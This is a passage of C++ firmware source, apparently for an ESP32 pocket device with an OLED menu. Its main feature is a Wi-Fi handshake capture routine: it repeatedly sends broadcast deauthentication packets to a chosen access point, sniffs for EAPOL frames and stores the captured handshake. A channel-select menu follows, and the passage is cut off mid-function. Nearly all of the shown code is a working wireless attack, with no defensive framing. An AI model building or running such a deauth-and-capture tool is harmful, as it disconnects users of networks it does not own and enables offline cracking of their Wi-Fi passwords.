void wifiHandshakeSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!wifiHandshakeCapturing) return;
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    int len = pkt->rx_ctrl.sig_len;
    uint8_t* payload = pkt->payload;
    
    if (len < 30) return;
    
    for (int i = 0; i < len - 8; i++) {
        if (payload[i] == 0x88 && payload[i + 1] == 0x8E) {
            wifiEapolCount++;
            String handshakeEntry = "[HANDSHAKE] " + wifiCurrentTargetSSID + 
                                   " | EAPOL: " + String(wifiEapolCount) + "\\n";
            storageAddHandshake(handshakeEntry);
            displayShowMessage("HANDSHAKE CAPTURED!", 2000);
            wifiHandshakeCapturing = false;
            return;
        }
    }
}

void wifiStartHandshakeSniffer() {
    if (wifiNetworkCount == 0) {
        displayShowMessage("Run SCAN first!", 1000);
        return;
    }
    
    int target = 0;
    while (true) {
        u8g2.clearBuffer();
        displayDrawTopBar();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(5, 15, "Select network:");
        
        for (int i = 0; i < min(wifiNetworkCount, 5); i++) {
            if (i == target) u8g2.drawStr(5, 30 + i * 8, ">");
            u8g2.drawStr(20, 30 + i * 8, wifiNetworkNames[i].substring(0, 14).c_str());
        }
        
        u8g2.drawStr(5, 60, "OK - Capture  BACK - Exit");
        u8g2.sendBuffer();
        
        if (displayCheckButton(BTN_UP) && target > 0) target--;
        else if (displayCheckButton(BTN_DOWN) && target < min(wifiNetworkCount, 5) - 1) target++;
        else if (displayCheckButton(BTN_OK)) break;
        else if (displayCheckButton(BTN_BACK)) return;
        delay(50);
    }
    
    wifiCurrentTargetSSID = wifiNetworkNames[target];
    memcpy(wifiTargetBSSID, wifiNetworkBSSID[target], 6);
    esp_wifi_set_channel(wifiNetworkChannel[target], WIFI_SECOND_CHAN_NONE);
    
    wifiEapolCount = 0;
    wifiHandshakeCapturing = true;
    
    displayShowMessage("Capturing handshake... 30 sec max", 1500);
    unsigned long start = millis();
    
    while (wifiHandshakeCapturing && millis() - start < 30000) {
        wifiSendDeauthPacket(wifiTargetBSSID, 
                            (uint8_t[]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, 
                            wifiNetworkChannel[target]);
        
        u8g2.clearBuffer();
        displayDrawTopBar();
        u8g2.setFont(u8g2_font_6x10_tr);
        
        char buf[32];
        sprintf(buf, "EAPOL packets: %d", wifiEapolCount);
        u8g2.drawStr(5, 30, buf);
        sprintf(buf, "Time: %d/30 sec", (millis() - start) / 1000);
        u8g2.drawStr(5, 45, buf);
        u8g2.drawStr(5, 60, "BACK - Abort");
        u8g2.sendBuffer();
        
        if (displayCheckButton(BTN_BACK)) wifiHandshakeCapturing = false;
        delay(100);
    }
    
    wifiHandshakeCapturing = false;
    if (wifiEapolCount > 0) {
        displayShowMessage("Handshake saved!", 1500);
    } else {
        displayShowMessage("Failed to capture handshake", 1500);
    }
}

void wifiStopHandshakeSniffer() {
    wifiHandshakeCapturing = false;
}

void wifiSetChannel() {
    int ch = 1;
    while (true) {
        u8g2.clearBuffer();
        displayDrawTopBar();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(40, 15, "WiFi Channel");
        u8g2.setFont(u8g2_font_logisoso24_tr);
        
        char buf[8];
        sprintf(buf, "%d", ch);
        int w = u8g2.getStrWidth(buf);
        u8g2.drawStr((128 - w) / 2, 48, buf);
        u8g2.drawStr(5, 30, "<");
        u8g2.drawStr(110, 30, ">");
        u8g2.setFont(u8g2_font_5x7_tr);
        u8g2.drawStr(2, 63, "LEFT/RIGHT=change OK=set BACK");
        u8g2.sendBuffer();
        
        if (displayCheckButton(14) && ch > 1) ch--;
        else if (displayCheckButton(27) && ch < 14) ch++;
        else if (displayCheckButton(BTN_OK)) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            displayShowMessage(("Channel set to " + String(ch)).c_str(), 1000);
            break;
        } else if (displayCheckButton(BTN_BACK)) break;
